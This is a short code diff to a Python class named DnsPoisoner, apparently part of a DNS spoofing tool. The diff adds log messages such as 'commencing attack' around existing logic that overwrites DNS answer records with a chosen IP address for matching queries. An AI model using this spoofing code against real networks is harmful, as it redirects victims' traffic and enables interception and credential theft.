@@ -45,7 +45,12 @@ class DnsPoisoner():
 
         ip_to_spoof = self.get_ip(packet[DNSQR].qname)
 
+        self.remove_line()
+        print "\ndnsrr intercepted"
+
         if ip_to_spoof:
+
+            print "url to spoof, commencing attack\n"
 
             if packet[DNSQR].qtype == "A":
                 packet[DNSRR].rdata = ip_to_spoof
@@ -57,6 +62,9 @@ class DnsPoisoner():
             
             if packet[DNSQR].qtype == "AAAA":
                 pass # TODO wat te doen met ipv6?
+
+        else:
+            print "not url to spoof, continuing\n"
 
         return packet
 
